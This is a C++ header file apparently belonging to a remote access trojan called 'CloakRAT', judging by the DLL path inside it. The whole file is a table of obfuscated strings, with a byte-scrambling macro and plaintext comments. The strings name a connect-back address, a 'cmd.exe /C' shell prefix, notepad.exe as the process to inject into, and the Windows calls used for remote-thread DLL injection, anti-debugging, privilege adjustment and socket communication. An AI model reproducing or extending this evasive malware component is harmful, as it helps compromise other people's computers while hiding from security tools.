#pragma once

#include <array>

#define BUILD_TIME_CIPHER_BYTE (uint8_t)((i % 4 | ((i * 9) + 2 + BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()] & ((i/2)>>3) * i + BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()]) << (i % 5)) & 0x7F ^ 99)
static std::array<uint8_t, 16> BUILD_TIME_KEY = { 249, 130, 192, 1, 236, 121, 141, 6, 250, 155, 233, 209, 242, 106, 132, 215 };

typedef struct EncryptedBytes {
    uint8_t* data;
    size_t length;
} EncryptedBytes;

// "127.0.0.1"
static uint8_t str_ip_data[] = { 34, 83, 83, 87, 77, 122, 71, 72, 77, 115 };
static EncryptedBytes str_ip = {
    str_ip_data,
    sizeof(str_ip_data)
};

// "cmd.exe /C"
static uint8_t str_cmd_data[] = { 36, 1, 12, 4, 77, 47, 17, 29, 67, 109, 99 };
static EncryptedBytes str_cmd = {
    str_cmd_data,
    sizeof(str_cmd_data)
};

// "C:\Users\tal78\Desktop\Workspace\CloakRAT\x64\Release\CloakRAT.dll"
static uint8_t str_dllPath_data[] = { 71, 33, 91, 60, 54, 57, 12, 10, 16, 30, 84, 33, 15, 85, 25, 124, 53, 67, 18, 75, 23, 29, 21, 20, 52, 57, 19, 27, 16, 2, 0, 99, 98, 30, 98, 8, 108, 3, 2, 114, 98, 46, 41, 40, 85, 86, 125, 50, 78, 94, 0, 21, 16, 71, 109, 3, 79, 21, 40, 43, 49, 33, 101, 78, 23, 10, 13 };
static EncryptedBytes str_dllPath = {
    str_dllPath_data,
    sizeof(str_dllPath_data)
};

// "notepad.exe"
static uint8_t str_procName_data[] = { 100, 12, 14, 20, 6, 58, 8, 28, 77, 39, 88, 37 };
static EncryptedBytes str_procName = {
    str_procName_data,
    sizeof(str_procName_data)
};

// "NtSetInformationThread"
static uint8_t str_NtSetInformationThread_data[] = { 56, 44, 21, 51, 6, 62, 32, 22, 5, 45, 82, 45, 2, 22, 72, 79, 31, 114, 9, 82, 6, 19, 1 };
static EncryptedBytes str_NtSetInformationThread = {
    str_NtSetInformationThread_data,
    sizeof(str_NtSetInformationThread_data)
};

// "GetCurrentThread"
static uint8_t str_GetCurrentThread_data[] = { 12, 37, 4, 20, 32, 63, 27, 10, 6, 44, 84, 20, 11, 16, 68, 65, 21 };
static EncryptedBytes str_GetCurrentThread = {
    str_GetCurrentThread_data,
    sizeof(str_GetCurrentThread_data)
};

// "Sleep"
static uint8_t str_Sleep_data[] = { 34, 49, 13, 5, 6, 58 };
static EncryptedBytes str_Sleep = {
    str_Sleep_data,
    sizeof(str_Sleep_data)
};

// "OpenProcess"
static uint8_t str_OpenProcess_data[] = { 43, 45, 17, 5, 13, 26, 27, 23, 0, 39, 83, 51 };
static EncryptedBytes str_OpenProcess = {
    str_OpenProcess_data,
    sizeof(str_OpenProcess_data)
};

// "VirtualAllocEx"
static uint8_t str_VirtualAllocEx_data[] = { 76, 52, 8, 18, 23, 63, 8, 20, 34, 46, 76, 47, 0, 39, 89 };
static EncryptedBytes str_VirtualAllocEx = {
    str_VirtualAllocEx_data,
    sizeof(str_VirtualAllocEx_data)
};

// "WriteProcessMemory"
static uint8_t str_WriteProcessMemory_data[] = { 24, 53, 19, 9, 23, 47, 57, 10, 12, 33, 69, 51, 16, 47, 68, 77, 30, 84, 24 };
static EncryptedBytes str_WriteProcessMemory = {
    str_WriteProcessMemory_data,
    sizeof(str_WriteProcessMemory_data)
};

// "LoadLibraryA"
static uint8_t str_LoadLibraryA_data[] = { 119, 46, 14, 1, 7, 6, 0, 26, 17, 35, 82, 57, 34 };
static EncryptedBytes str_LoadLibraryA = {
    str_LoadLibraryA_data,
    sizeof(str_LoadLibraryA_data)
};

// "CreateRemoteThread"
static uint8_t str_CreateRemoteThread_data[] = { 33, 33, 19, 5, 2, 62, 12, 42, 6, 47, 79, 52, 6, 54, 73, 82, 20, 71, 5 };
static EncryptedBytes str_CreateRemoteThread = {
    str_CreateRemoteThread_data,
    sizeof(str_CreateRemoteThread_data)
};

// "CloseHandle"
static uint8_t str_CloseHandle_data[] = { 66, 33, 13, 15, 16, 47, 33, 25, 13, 38, 76, 37 };
static EncryptedBytes str_CloseHandle = {
    str_CloseHandle_data,
    sizeof(str_CloseHandle_data)
};

// "LookupPrivilegeValueA"
static uint8_t str_LookupPrivilegeValueA_data[] = { 26, 46, 14, 15, 8, 63, 25, 40, 17, 43, 86, 41, 15, 7, 70, 69, 39, 71, 13, 85, 6, 51 };
static EncryptedBytes str_LookupPrivilegeValueA = {
    str_LookupPrivilegeValueA_data,
    sizeof(str_LookupPrivilegeValueA_data)
};

// "GetLastError"
static uint8_t str_GetLastError_data[] = { 7, 37, 4, 20, 47, 43, 26, 12, 38, 48, 82, 47, 17 };
static EncryptedBytes str_GetLastError = {
    str_GetLastError_data,
    sizeof(str_GetLastError_data)
};

// "AdjustTokenPrivileges"
static uint8_t str_AdjustTokenPrivileges_data[] = { 64, 35, 5, 10, 22, 57, 29, 44, 12, 41, 69, 46, 51, 16, 72, 86, 24, 74, 4, 71, 6, 1 };
static EncryptedBytes str_AdjustTokenPrivileges = {
    str_AdjustTokenPrivileges_data,
    sizeof(str_AdjustTokenPrivileges_data)
};

// "OpenProcessToken"
static uint8_t str_OpenProcessToken_data[] = { 30, 45, 17, 5, 13, 26, 27, 23, 0, 39, 83, 51, 55, 13, 74, 69, 31 };
static EncryptedBytes str_OpenProcessToken = {
    str_OpenProcessToken_data,
    sizeof(str_OpenProcessToken_data)
};

// "GetCurrentProcess"
static uint8_t str_GetCurrentProcess_data[] = { 115, 37, 4, 20, 32, 63, 27, 10, 6, 44, 84, 16, 17, 13, 66, 69, 2, 85 };
static EncryptedBytes str_GetCurrentProcess = {
    str_GetCurrentProcess_data,
    sizeof(str_GetCurrentProcess_data)
};

// "CreateToolhelp32Snapshot"
static uint8_t str_CreateToolhelp32Snapshot_data[] = { 109, 33, 19, 5, 2, 62, 12, 44, 12, 45, 76, 40, 6, 14, 81, 19, 67, 117, 15, 65, 19, 1, 13, 39, 23 };
static EncryptedBytes str_CreateToolhelp32Snapshot = {
    str_CreateToolhelp32Snapshot_data,
    sizeof(str_CreateToolhelp32Snapshot_data)
};

// "Process32First"
static uint8_t str_Process32First_data[] = { 126, 50, 19, 15, 0, 47, 26, 11, 80, 112, 102, 41, 17, 17, 85 };
static EncryptedBytes str_Process32First = {
    str_Process32First_data,
    sizeof(str_Process32First_data)
};

// "Process32Next"
static uint8_t str_Process32Next_data[] = { 125, 50, 19, 15, 0, 47, 26, 11, 80, 112, 110, 37, 27, 22 };
static EncryptedBytes str_Process32Next = {
    str_Process32Next_data,
    sizeof(str_Process32Next_data)
};

// "CreatePipe"
static uint8_t str_CreatePipe_data[] = { 107, 33, 19, 5, 2, 62, 12, 40, 10, 50, 69 };
static EncryptedBytes str_CreatePipe = {
    str_CreatePipe_data,
    sizeof(str_CreatePipe_data)
};

// "SetHandleInformation"
static uint8_t str_SetHandleInformation_data[] = { 96, 49, 4, 20, 43, 43, 7, 28, 15, 39, 105, 46, 5, 13, 83, 77, 16, 82, 8, 79, 13 };
static EncryptedBytes str_SetHandleInformation = {
    str_SetHandleInformation_data,
    sizeof(str_SetHandleInformation_data)
};

// "ReadFile"
static uint8_t str_ReadFile_data[] = { 11, 48, 4, 1, 7, 12, 0, 20, 6 };
static EncryptedBytes str_ReadFile = {
    str_ReadFile_data,
    sizeof(str_ReadFile_data)
};

// "FormatMessageA"
static uint8_t str_FormatMessageA_data[] = { 44, 36, 14, 18, 14, 43, 29, 53, 6, 49, 83, 33, 4, 7, 96 };
static EncryptedBytes str_FormatMessageA = {
    str_FormatMessageA_data,
    sizeof(str_FormatMessageA_data)
};

// "LocalFree"
static uint8_t str_LocalFree_data[] = { 94, 46, 14, 3, 2, 38, 47, 10, 6, 39 };
static EncryptedBytes str_LocalFree = {
    str_LocalFree_data,
    sizeof(str_LocalFree_data)
};

// "CreateProcessA"
static uint8_t str_CreateProcessA_data[] = { 47, 33, 19, 5, 2, 62, 12, 40, 17, 45, 67, 37, 16, 17, 96 };
static EncryptedBytes str_CreateProcessA = {
    str_CreateProcessA_data,
    sizeof(str_CreateProcessA_data)
};

// "IsDebuggerPresent"
static uint8_t str_IsDebuggerPresent_data[] = { 50, 43, 18, 36, 6, 40, 28, 31, 4, 39, 82, 16, 17, 7, 82, 69, 31, 82 };
static EncryptedBytes str_IsDebuggerPresent = {
    str_IsDebuggerPresent_data,
    sizeof(str_IsDebuggerPresent_data)
};

// "GetModuleHandleW"
static uint8_t str_GetModuleHandleW_data[] = { 38, 37, 4, 20, 46, 37, 13, 13, 15, 39, 104, 33, 13, 6, 77, 69, 38 };
static EncryptedBytes str_GetModuleHandleW = {
    str_GetModuleHandleW_data,
    sizeof(str_GetModuleHandleW_data)
};

// "VirtualProtect"
static uint8_t str_VirtualProtect_data[] = { 113, 52, 8, 18, 23, 63, 8, 20, 51, 48, 79, 52, 6, 1, 85 };
static EncryptedBytes str_VirtualProtect = {
    str_VirtualProtect_data,
    sizeof(str_VirtualProtect_data)
};

// "HeapSetInformation"
static uint8_t str_HeapSetInformation_data[] = { 61, 42, 4, 1, 19, 25, 12, 12, 42, 44, 70, 47, 17, 15, 64, 84, 24, 73, 15 };
static EncryptedBytes str_HeapSetInformation = {
    str_HeapSetInformation_data,
    sizeof(str_HeapSetInformation_data)
};

// "FindWindowW"
static uint8_t str_FindWindowW_data[] = { 22, 36, 8, 14, 7, 29, 0, 22, 7, 45, 87, 23 };
static EncryptedBytes str_FindWindowW = {
    str_FindWindowW_data,
    sizeof(str_FindWindowW_data)
};

// "GetProcessHeap"
static uint8_t str_GetProcessHeap_data[] = { 0, 37, 4, 20, 51, 56, 6, 27, 6, 49, 83, 8, 6, 3, 81 };
static EncryptedBytes str_GetProcessHeap = {
    str_GetProcessHeap_data,
    sizeof(str_GetProcessHeap_data)
};

// "GetComputerNameW"
static uint8_t str_GetComputerNameW_data[] = { 23, 37, 4, 20, 32, 37, 4, 8, 22, 54, 69, 50, 45, 3, 76, 69, 38 };
static EncryptedBytes str_GetComputerNameW = {
    str_GetComputerNameW_data,
    sizeof(str_GetComputerNameW_data)
};

// "OpenThread"
static uint8_t str_OpenThread_data[] = { 11, 45, 17, 5, 13, 30, 1, 10, 6, 35, 68 };
static EncryptedBytes str_OpenThread = {
    str_OpenThread_data,
    sizeof(str_OpenThread_data)
};

// "GetEnvironmentVariableW"
static uint8_t str_GetEnvironmentVariableW_data[] = { 88, 37, 4, 20, 38, 36, 31, 17, 17, 45, 78, 45, 6, 12, 85, 118, 16, 84, 8, 65, 1, 30, 0, 31 };
static EncryptedBytes str_GetEnvironmentVariableW = {
    str_GetEnvironmentVariableW_data,
    sizeof(str_GetEnvironmentVariableW_data)
};

// "GetThreadContext"
static uint8_t str_GetThreadContext_data[] = { 24, 37, 4, 20, 55, 34, 27, 29, 2, 38, 99, 47, 13, 22, 68, 88, 5 };
static EncryptedBytes str_GetThreadContext = {
    str_GetThreadContext_data,
    sizeof(str_GetThreadContext_data)
};

// "IsWow64Process"
static uint8_t str_IsWow64Process_data[] = { 98, 43, 18, 55, 12, 61, 95, 76, 51, 48, 79, 35, 6, 17, 82 };
static EncryptedBytes str_IsWow64Process = {
    str_IsWow64Process_data,
    sizeof(str_IsWow64Process_data)
};

// "GetWindowLongPtrW"
static uint8_t str_GetWindowLongPtrW_data[] = { 83, 37, 4, 20, 52, 35, 7, 28, 12, 53, 108, 47, 13, 5, 113, 84, 3, 113 };
static EncryptedBytes str_GetWindowLongPtrW = {
    str_GetWindowLongPtrW_data,
    sizeof(str_GetWindowLongPtrW_data)
};

// "GetWindowRect"
static uint8_t str_GetWindowRect_data[] = { 68, 37, 4, 20, 52, 35, 7, 28, 12, 53, 114, 37, 0, 22 };
static EncryptedBytes str_GetWindowRect = {
    str_GetWindowRect_data,
    sizeof(str_GetWindowRect_data)
};

// "WSAStartup"
static uint8_t str_WSAStartup_data[] = { 45, 53, 50, 33, 48, 62, 8, 10, 23, 55, 80 };
static EncryptedBytes str_WSAStartup = {
    str_WSAStartup_data,
    sizeof(str_WSAStartup_data)
};

// "htons"
static uint8_t str_htons_data[] = { 92, 10, 21, 15, 13, 57 };
static EncryptedBytes str_htons = {
    str_htons_data,
    sizeof(str_htons_data)
};

// "inet_pton"
static uint8_t str_inet_pton_data[] = { 90, 11, 15, 5, 23, 21, 25, 12, 12, 44 };
static EncryptedBytes str_inet_pton = {
    str_inet_pton_data,
    sizeof(str_inet_pton_data)
};

// "connect"
static uint8_t str_connect_data[] = { 46, 1, 14, 14, 13, 47, 10, 12 };
static EncryptedBytes str_connect = {
    str_connect_data,
    sizeof(str_connect_data)
};

// "htonl"
static uint8_t str_htonl_data[] = { 114, 10, 21, 15, 13, 38 };
static EncryptedBytes str_htonl = {
    str_htonl_data,
    sizeof(str_htonl_data)
};

// "send"
static uint8_t str_send_data[] = { 44, 17, 4, 14, 7 };
static EncryptedBytes str_send = {
    str_send_data,
    sizeof(str_send_data)
};

// "socket"
static uint8_t str_socket_data[] = { 81, 17, 14, 3, 8, 47, 29 };
static EncryptedBytes str_socket = {
    str_socket_data,
    sizeof(str_socket_data)
};

// "recv"
static uint8_t str_recv_data[] = { 115, 16, 4, 3, 21 };
static EncryptedBytes str_recv = {
    str_recv_data,
    sizeof(str_recv_data)
};

// "ntohl"
static uint8_t str_ntohl_data[] = { 123, 12, 21, 15, 11, 38 };
static EncryptedBytes str_ntohl = {
    str_ntohl_data,
    sizeof(str_ntohl_data)
};

// "closesocket"
static uint8_t str_closesocket_data[] = { 28, 1, 13, 15, 16, 47, 26, 23, 0, 41, 69, 52 };
static EncryptedBytes str_closesocket = {
    str_closesocket_data,
    sizeof(str_closesocket_data)
};

// "WSACleanup"
static uint8_t str_WSACleanup_data[] = { 95, 53, 50, 33, 32, 38, 12, 25, 13, 55, 80 };
static EncryptedBytes str_WSACleanup = {
    str_WSACleanup_data,
    sizeof(str_WSACleanup_data)
};

// "kernel32.dll"
static uint8_t str_kernel32_data[] = { 125, 9, 4, 18, 13, 47, 5, 75, 81, 108, 68, 44, 15 };
static EncryptedBytes str_kernel32 = {
    str_kernel32_data,
    sizeof(str_kernel32_data)
};

// "ntdll.dll"
static uint8_t str_ntdll_data[] = { 47, 12, 21, 4, 15, 38, 71, 28, 15, 46 };
static EncryptedBytes str_ntdll = {
    str_ntdll_data,
    sizeof(str_ntdll_data)
};

// "advapi32.dll"
static uint8_t str_advapi32_data[] = { 88, 3, 5, 22, 2, 58, 0, 75, 81, 108, 68, 44, 15 };
static EncryptedBytes str_advapi32 = {
    str_advapi32_data,
    sizeof(str_advapi32_data)
};

// "ws2_32.dll"
static uint8_t str_ws2_32_data[] = { 114, 21, 18, 82, 60, 121, 91, 86, 7, 46, 76 };
static EncryptedBytes str_ws2_32 = {
    str_ws2_32_data,
    sizeof(str_ws2_32_data)
};

// "user32.dll"
static uint8_t str_user32_data[] = { 105, 23, 18, 5, 17, 121, 91, 86, 7, 46, 76 };
static EncryptedBytes str_user32 = {
    str_user32_data,
    sizeof(str_user32_data)
};

// "WSAGetLastError"
static uint8_t str_WSAGetLastError_data[] = { 82, 53, 50, 33, 36, 47, 29, 52, 2, 49, 84, 5, 17, 16, 78, 82 };
static EncryptedBytes str_WSAGetLastError = {
    str_WSAGetLastError_data,
    sizeof(str_WSAGetLastError_data)
};

